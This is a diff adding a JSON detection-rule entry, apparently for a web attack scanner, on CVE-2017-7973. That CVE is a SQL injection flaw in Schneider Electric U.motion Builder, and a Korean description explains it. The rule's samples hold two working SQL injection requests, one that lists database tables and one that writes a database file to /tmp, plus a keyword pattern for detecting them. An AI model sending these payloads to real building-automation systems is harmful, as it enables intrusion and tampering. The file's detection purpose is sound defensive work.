@@ -1,0 +1,11 @@
+{
+        "Name": "Schneider Electric U.motion Builder SQL Injection-1",
+        "Description": "U.motion은 주택 및 빌딩 자동화 시스템의 감독 및 시각화를 위한 장치 제품군 (U.motion Builder는 U.motion 디바이스를 위한 프로젝트 생성에 사용)\n - track_import_export.php에 전달되는 object_id 파라미터 값에 SQL Injection 공격에 사용되는 문자SQL 쿼리문이 포함되어 있는지 여부를 제대로 검증하지 못해 발생",
+        "References": ["CVE-2017-7973"],
+        "Samples": [
+                "GET /umotion/modules/system/loadtemplate.php?body_template=category.tpl&tpl=1%27+Union+SELECT+group_concat%28tbl_name%29%2C2+FROM+sqlite_master+WHERE+type%3D%27table%27+and+tbl_name+NOT+like+%27sqlite_%25%27%3B--&context=runtime&format=sql HTTP/1.1",
+                "GET /umotion/modules/reporting/track_import_export.php?object_id=1%27%3B+ATTACH+DATABASE+%27%2Ftmp%2Fpoc.db%27+AS+poc%3B+CREATE+TABLE+poc.POC+%28code+int%29%3B-- HTTP/1.1"
+                   ],
+        "Keywords": [["track_import_export.php?object_id="]],
+        "Signature": []
+}
